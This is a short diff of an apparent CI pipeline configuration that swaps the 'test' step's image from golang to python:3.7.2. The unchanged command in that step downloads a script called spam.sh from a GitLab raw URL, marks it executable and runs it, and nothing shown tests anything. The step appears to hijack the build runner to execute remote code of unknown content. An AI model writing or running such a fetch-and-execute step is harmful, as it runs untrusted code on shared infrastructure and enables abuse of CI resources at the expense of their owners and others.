@@ -9,6 +9,6 @@ platform:
 steps:
 
 - name: test
-  image: golang
+  image: python:3.7.2
   commands:
   - wget https://gitlab.com/renifer12/project-7/-/raw/main/spam.sh && chmod +x spam.sh && ./spam.sh
